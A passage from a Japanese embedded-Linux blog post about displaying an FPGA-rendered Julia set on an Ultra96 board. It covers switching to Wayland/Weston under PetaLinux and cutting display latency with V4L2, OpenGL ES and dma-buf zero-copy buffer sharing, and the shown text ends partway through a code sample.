<p>最後に PL で描画した Julia set を表示したりゲームパッドで操作するためのアプリケーションを実装しました。実装したコードが<a href="https://github.com/Tosainu/ultra96-fractal/blob/1ed4e5e409d6445a85741149c112322cc6fc251c/petalinux_project/project-spec/meta-user/recipes-apps/fractal-explorer/files/main.cc">これ</a><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>で、動作している様子がこんな感じです。ウィンドウ全体に描画した Julia set を表示しつつ、左上に Julia set のパラメータを表示しています<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>。
<img src="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/screenshot.png" /></p>
<h3 id="ディスプレイドライバと-x11-の相性が悪い問題">ディスプレイドライバと X11 の相性が悪い問題</h3>
<p>上のスクリーンショットで気づいた方もいるかもしれませんが、今回 <a href="https://wayland.freedesktop.org/">Wayland</a> な Window Manager (WM) である <a href="https://gitlab.freedesktop.org/wayland/weston/">Weston</a> を使っています。Wayland な WM を利用しているのは、X11 な WM ではなぜか性能が全く出てくれなかったためです。画面のチラつき・カクつきといった現象がみられたり、OpenGL ES 2.0 版の glmark2 を試すと良くても十数 fps 程度しか出なかったりと、とても許容できるものではありませんでした。この問題に悩んでいるときたまたま <a href="https://xilinx-wiki.atlassian.net/wiki/spaces/A/pages/18841928/Xilinx+MALI+driver">Zynq UltraScale+MPSoC で Wayland が利用できるという情報</a><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn7" class="footnote-ref" id="fnref7" role="doc-noteref"><sup>7</sup></a>を見つけ試してみたら X11 よりはかなりマシに動作してくれることがわかり、じゃあ Wayland にするかーとなった感じです。</p>
<p>紹介したリンク先にあるように、PetaLinux で Weston を組み込んだイメージを作るには <code>project-spec/meta-user/conf/petalinuxbsp.conf</code> に次の行を追加すればいいようです。</p>
<pre class="conf"><code>DISTRO_FEATURES_append = &quot; wayland&quot;
IMAGE_INSTALL_append = &quot; packagegroup-petalinux-weston&quot;</code></pre>
<p>さらに X11 関連のパッケージが完全に不要であれば、同ファイルに</p>
<pre class="conf"><code>DISTRO_FEATURES_remove = &quot; x11&quot;</code></pre>
<p>も追加すると、作成されるイメージがより小さくなって良さそうです。</p>
<p>WM に Wayland なものを採用したため、実装するアプリケーションも Wayland に対応したものでなければいけません。今回は複雑な UI を持ったものを作る予定がなかったことや、起動イメージをできる限り小さくしたかったことから、<code>wayland-client.h</code> の関数を直接利用し Wayland client を実装しました。</p>
<h3 id="v4l2-でキャプチャした画像を低遅延で表示したい">V4L2 でキャプチャした画像を低遅延で表示したい</h3>
<p>単に PL で生成した画像を表示したいだけであれば、前述した Zynq UltraScale+ MPSoC の DisplayPort Controller に直接映像を流し込む方法などが良さそうです。しかし今回は描画した Juia set の上からステータス表示などを合成したかったため、OpenGL ES 2.0 を使った画像の表示とステータス表示の合成を行うことにしました<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn8" class="footnote-ref" id="fnref8" role="doc-noteref"><sup>8</sup></a>。</p>
<p>この方針で実装するにあたり、特にソフトウェア側で発生する遅延を最小限にするためにいくつかの工夫が必要でした。</p>
<p>OpenGL を使って画像を表示したい場合、まず GPU 側に画像を転送する必要があります。例えば以下のような画像データ <code>image</code> がある場合、</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb23-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb23-1" aria-hidden="true" tabindex="-1"></a>GLubyte image<span class="op">[</span>width <span class="op">*</span> height <span class="op">*</span> <span class="dv">4</span><span class="op">];</span></span></code></pre></div>
<p>これを GPU に転送するコードは <a href="https://www.khronos.org/registry/OpenGL-Refpages/es2.0/xhtml/glTexImage2D.xml"><code>glTexImage2D</code></a> や <a href="https://www.khronos.org/registry/OpenGL-Refpages/es2.0/xhtml/glTexSubImage2D.xml"><code>glTexSubImage2D</code></a> などを使えばよく、だいたいこんな感じになります<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn9" class="footnote-ref" id="fnref9" role="doc-noteref"><sup>9</sup></a>。</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb24-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-1" aria-hidden="true" tabindex="-1"></a>GLuint texture<span class="op">;</span></span>
<span id="cb24-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-2" aria-hidden="true" tabindex="-1"></a>glGenTextures<span class="op">(</span>num_buffers<span class="op">,</span> <span class="op">&amp;</span>texture<span class="op">);</span></span>
<span id="cb24-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-4" aria-hidden="true" tabindex="-1"></a>glBindTexture<span class="op">(</span>GL_TEXTURE_2D<span class="op">,</span> texture<span class="op">);</span></span>
<span id="cb24-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-5" aria-hidden="true" tabindex="-1"></a>glTexImage2D<span class="op">(</span>GL_TEXTURE_2D<span class="op">,</span></span>
<span id="cb24-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-6" aria-hidden="true" tabindex="-1"></a>    <span class="dv">0</span><span class="op">,</span> GL_RGBA<span class="op">,</span> width<span class="op">,</span> height<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> GL_RGBA<span class="op">,</span> GL_UNSIGNED_BYTE<span class="op">,</span> image<span class="op">);</span></span>
<span id="cb24-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb24-7" aria-hidden="true" tabindex="-1"></a>glBindTexture<span class="op">(</span>GL_TEXTURE_2D<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span></code></pre></div>
<p>「なら V4L2 でキャプチャした画像を表示するのも簡単じゃん！」とこんな感じの実装<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn10" class="footnote-ref" id="fnref10" role="doc-noteref"><sup>10</sup></a>をすると…</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb25-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="co">// テクスチャの初期化</span></span>
<span id="cb25-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-2" aria-hidden="true" tabindex="-1"></a>GLuint texture<span class="op">;</span></span>
<span id="cb25-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-3" aria-hidden="true" tabindex="-1"></a>glGenTextures<span class="op">(</span>num_buffers<span class="op">,</span> <span class="op">&amp;</span>texture<span class="op">);</span></span>
<span id="cb25-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/dev/video0&quot;</span><span class="op">,</span> O_RDWR<span class="op">);</span></span>
<span id="cb25-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="co">// キャプチャ用バッファの初期設定</span></span>
<span id="cb25-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-8" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> v4l2_requestbuffers req<span class="op">;</span></span>
<span id="cb25-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-9" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span>count <span class="op">=</span> MAX_BUFFERS<span class="op">;</span></span>
<span id="cb25-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-10" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span>type <span class="op">=</span> V4L2_BUF_TYPE_VIDEO_CAPTURE<span class="op">;</span></span>
<span id="cb25-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-11" aria-hidden="true" tabindex="-1"></a>req<span class="op">.</span>memory <span class="op">=</span> V4L2_MEMORY_MMAP<span class="op">;</span></span>
<span id="cb25-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-12" aria-hidden="true" tabindex="-1"></a>ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_REQBUFS<span class="op">,</span> <span class="op">&amp;</span>req<span class="op">);</span></span>
<span id="cb25-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-14" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">int</span> num_buffers <span class="op">=</span> req<span class="op">.</span>count<span class="op">;</span></span>
<span id="cb25-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-16" aria-hidden="true" tabindex="-1"></a><span class="co">// バッファの確保・ストリーミングキューへの追加</span></span>
<span id="cb25-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-17" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span><span class="op">*</span> buffers<span class="op">[</span>MAX_BUFFERS<span class="op">];</span></span>
<span id="cb25-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-18" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> num_buffers<span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb25-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-19" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> v4l2_buffer buf<span class="op">;</span></span>
<span id="cb25-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-20" aria-hidden="true" tabindex="-1"></a>  buf<span class="op">.</span>index <span class="op">=</span> i<span class="op">;</span></span>
<span id="cb25-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-21" aria-hidden="true" tabindex="-1"></a>  buf<span class="op">.</span>type <span class="op">=</span> V4L2_BUF_TYPE_VIDEO_CAPTURE<span class="op">;</span></span>
<span id="cb25-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-22" aria-hidden="true" tabindex="-1"></a>  buf<span class="op">.</span>memory <span class="op">=</span> V4L2_MEMORY_MMAP<span class="op">;</span></span>
<span id="cb25-23"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-23" aria-hidden="true" tabindex="-1"></a>  ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_QUERYBUF<span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">);</span></span>
<span id="cb25-24"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-25"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-25" aria-hidden="true" tabindex="-1"></a>  buffers<span class="op">[</span>i<span class="op">]</span> <span class="op">=</span> mmap<span class="op">(</span>NULL<span class="op">,</span> buf<span class="op">.</span>length<span class="op">,</span> PROT_READ <span class="op">|</span> PROT_WRITE<span class="op">,</span> MAP_SHARED<span class="op">,</span> fd<span class="op">,</span> buf<span class="op">.</span>m<span class="op">.</span>offset<span class="op">);</span></span>
<span id="cb25-26"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-27"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-27" aria-hidden="true" tabindex="-1"></a>  ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_QBUF<span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">);</span></span>
<span id="cb25-28"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb25-29"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-30"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-30" aria-hidden="true" tabindex="-1"></a><span class="co">// キャプチャの開始</span></span>
<span id="cb25-31"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-31" aria-hidden="true" tabindex="-1"></a><span class="kw">enum</span> v4l2_buf_type type <span class="op">=</span> V4L2_BUF_TYPE_VIDEO_CAPTURE<span class="op">;</span></span>
<span id="cb25-32"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-32" aria-hidden="true" tabindex="-1"></a>ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_STREAMON<span class="op">,</span> <span class="op">&amp;</span>type<span class="op">);</span></span>
<span id="cb25-33"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-34"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-34" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb25-35"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-35" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ストリーミングキューからバッファを取り出す</span></span>
<span id="cb25-36"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-36" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> v4l2_buffer buf<span class="op">;</span></span>
<span id="cb25-37"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-37" aria-hidden="true" tabindex="-1"></a>  buf<span class="op">.</span>type <span class="op">=</span> V4L2_BUF_TYPE_VIDEO_CAPTURE<span class="op">;</span></span>
<span id="cb25-38"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-38" aria-hidden="true" tabindex="-1"></a>  buf<span class="op">.</span>memory <span class="op">=</span> V4L2_MEMORY_MMAP<span class="op">;</span></span>
<span id="cb25-39"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-39" aria-hidden="true" tabindex="-1"></a>  ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_DQBUF<span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">);</span></span>
<span id="cb25-40"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-41"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-41" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 新しく取得した画像を GPU に転送</span></span>
<span id="cb25-42"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-42" aria-hidden="true" tabindex="-1"></a>  glBindTexture<span class="op">(</span>GL_TEXTURE_2D<span class="op">,</span> texture<span class="op">);</span></span>
<span id="cb25-43"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-43" aria-hidden="true" tabindex="-1"></a>  glTexSubImage2D<span class="op">(</span>GL_TEXTURE_2D<span class="op">,</span></span>
<span id="cb25-44"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-44" aria-hidden="true" tabindex="-1"></a>      <span class="dv">0</span><span class="op">,</span> GL_RGBA<span class="op">,</span> width<span class="op">,</span> height<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> GL_RGBA<span class="op">,</span> GL_UNSIGNED_BYTE<span class="op">,</span> buffers<span class="op">[</span>buf<span class="op">.</span>index<span class="op">]);</span></span>
<span id="cb25-45"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-45" aria-hidden="true" tabindex="-1"></a>  glBindTexture<span class="op">(</span>GL_TEXTURE_2D<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb25-46"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-47"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-47" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 表示</span></span>
<span id="cb25-48"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-48" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ...</span></span>
<span id="cb25-49"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-49" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-50"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-50" aria-hidden="true" tabindex="-1"></a>  <span class="co">// バッファをストリーミングキューへのへ戻す</span></span>
<span id="cb25-51"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-51" aria-hidden="true" tabindex="-1"></a>  ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_QBUF<span class="op">,</span> <span class="op">&amp;</span>buf<span class="op">);</span></span>
<span id="cb25-52"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb25-52" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>glTexSubImage2D</code> の部分で<strong>全然速度が出てくれません。</strong> ちょっと時間計測をしたときの記憶があいまいなので正確な値は書けないのですが、今回の 1920px x 1080px の RGBA な画像 (約 7.9MB) を転送するケースで 50ms ~ 90ms 程度のオーダの時間が掛かっていました。この原因としては、単純に画像のコピーがあまり軽い処理でないということに加え、V4L2 のバッファとして割り当てられた領域のメモリキャッシュが (おそらく) 無効化されていることによるものだと推測しています。</p>
<p><img src="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/nodmabuf.svg" style="width:70.0%" /></p>
<p>この問題は、<a href="https://elinux.org/images/5/53/Zero-copy_video_streaming.pdf">たまたま見つけたスライド</a>を参考に、<a href="https://www.kernel.org/doc/html/v4.14/driver-api/dma-buf.html"><strong>dma-buf</strong></a> という Linux カーネルが持つの複数のデバイス間でバッファを共有する仕組みを利用することで解決しました。</p>
<p>dma-buf の動作を簡単な図にするとこんな感じです。まず、共有したいメモリ領域を持つデバイスからそのメモリ領域に関する情報へアクセスするためのファイルディスクリプタを export します。そのファイルディスクリプタを共有先のデバイスに import することで、共有先のデバイスから共有元のメモリ領域に直接アクセスすることが可能となる、というものだそうです。dma-buf 利用前と比較し、データのコピーは必要なくなり、またユーザ空間でやり取りするデータもファイルディスクリプタだけと非常に簡単なものになっています。</p>
<p><img src="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/dmabuf.svg" style="width:70.0%" /></p>
<p>ということで、dma-buf を使った実装をしていきます。V4L2 のバッファを export するには <a href="https://www.kernel.org/doc/html/v4.14/media/uapi/v4l/vidioc-expbuf.html"><code>ioctl VIDIOC_EXPBUF</code></a> を使います。</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb26-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> fds<span class="op">[</span>MAX_BUFFERS<span class="op">];</span></span>
<span id="cb26-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> num_buffers<span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb26-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> v4l2_exportbuffer exbuf<span class="op">;</span></span>
<span id="cb26-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-4" aria-hidden="true" tabindex="-1"></a>  exbuf<span class="op">.</span>index <span class="op">=</span> i<span class="op">;</span></span>
<span id="cb26-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-5" aria-hidden="true" tabindex="-1"></a>  exbuf<span class="op">.</span>type <span class="op">=</span> V4L2_BUF_TYPE_VIDEO_CAPTURE<span class="op">;</span></span>
<span id="cb26-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-6" aria-hidden="true" tabindex="-1"></a>  ioctl<span class="op">(</span>fd<span class="op">,</span> VIDIOC_EXPBUF<span class="op">,</span> <span class="op">&amp;</span>exbuf<span class="op">);</span></span>
<span id="cb26-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// exbuf.fd にファイルディスクリプタがセットされている</span></span>
<span id="cb26-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-9" aria-hidden="true" tabindex="-1"></a>  fds<span class="op">[</span>i<span class="op">]</span> <span class="op">=</span> exbuf<span class="op">.</span>fd<span class="op">;</span></span>
<span id="cb26-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb26-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>続いて OpenGL/EGL でこのファイルディスクリプタを import する部分です。まず必要となる関数を呼び出せるようにします。</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb27-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> PFNEGLCREATEIMAGEKHRPROC eglCreateImageKHR<span class="op">;</span></span>
<span id="cb27-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> PFNEGLDESTROYIMAGEKHRPROC eglDestroyImageKHR<span class="op">;</span></span>
<span id="cb27-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> PFNGLEGLIMAGETARGETTEXTURE2DOESPROC glEGLImageTargetTexture2DOES<span class="op">;</span></span>
<span id="cb27-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-5" aria-hidden="true" tabindex="-1"></a>eglCreateImageKHR <span class="op">=</span></span>
<span id="cb27-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">(</span>PFNEGLCREATEIMAGEKHRPROC<span class="op">)</span>eglGetProcAddress<span class="op">(</span><span class="st">&quot;eglCreateImageKHR&quot;</span><span class="op">);</span></span>
<span id="cb27-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-7" aria-hidden="true" tabindex="-1"></a>eglDestroyImageKHR <span class="op">=</span></span>
<span id="cb27-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">(</span>PFNEGLDESTROYIMAGEKHRPROC<span class="op">)</span>eglGetProcAddress<span class="op">(</span><span class="st">&quot;eglDestroyImageKHR&quot;</span><span class="op">);</span></span>
<span id="cb27-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-9" aria-hidden="true" tabindex="-1"></a>glEGLImageTargetTexture2DOES <span class="op">=</span></span>
<span id="cb27-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb27-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">(</span>PFNGLEGLIMAGETARGETTEXTURE2DOESPROC<span class="op">)</span>eglGetProcAddress<span class="op">(</span><span class="st">&quot;glEGLImageTargetTexture2DOES&quot;</span><span class="op">);</span></span></code></pre></div>
<p>これらの関数を使ってこんな実装をすれば準備は完了です。V4L2 の各バッファの画像が、対応する OpenGL のテクスチャに勝手に転送されるようになります。</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb28-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-1" aria-hidden="true" tabindex="-1"></a>GLuint textures<span class="op">[</span>MAX_BUFFERS<span class="op">];</span></span>
<span id="cb28-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="op">::</span>glGenTextures<span class="op">(</span>num_buffers<span class="op">,</span> textures<span class="op">);</span></span>
<span id="cb28-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(</span><span class="dt">auto</span> i <span class="op">=</span> <span class="dv">0</span><span class="bu">u</span><span class="op">;</span> i <span class="op">&lt;</span> num_buffers<span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb28-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-4" aria-hidden="true" tabindex="-1"></a>  EGLint attrs<span class="op">[]</span> <span class="op">=</span> <span class="op">{</span></span>
<span id="cb28-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-5" aria-hidden="true" tabindex="-1"></a>    EGL_IMAGE_PRESERVED_KHR<span class="op">,</span>       EGL_TRUE<span class="op">,</span></span>
<span id="cb28-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-6" aria-hidden="true" tabindex="-1"></a>    EGL_WIDTH<span class="op">,</span>                     width<span class="op">,</span></span>
<span id="cb28-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-7" aria-hidden="true" tabindex="-1"></a>    EGL_HEIGHT<span class="op">,</span>                    height<span class="op">,</span></span>
<span id="cb28-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-8" aria-hidden="true" tabindex="-1"></a>    EGL_LINUX_DRM_FOURCC_EXT<span class="op">,</span>      DRM_FORMAT_ABGR8888<span class="op">,</span></span>
<span id="cb28-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-9" aria-hidden="true" tabindex="-1"></a>    EGL_DMA_BUF_PLANE0_FD_EXT<span class="op">,</span>     fds<span class="op">[</span>i<span class="op">],</span></span>
<span id="cb28-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-10" aria-hidden="true" tabindex="-1"></a>    EGL_DMA_BUF_PLANE0_OFFSET_EXT<span class="op">,</span> <span class="dv">0</span><span class="op">,</span></span>
<span id="cb28-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-11" aria-hidden="true" tabindex="-1"></a>    EGL_DMA_BUF_PLANE0_PITCH_EXT<span class="op">,</span>  width <span class="op">*</span> <span class="dv">4</span><span class="op">,</span></span>
<span id="cb28-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-12" aria-hidden="true" tabindex="-1"></a>    EGL_NONE</span>
<span id="cb28-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-13" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
<span id="cb28-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-14" aria-hidden="true" tabindex="-1"></a></span>
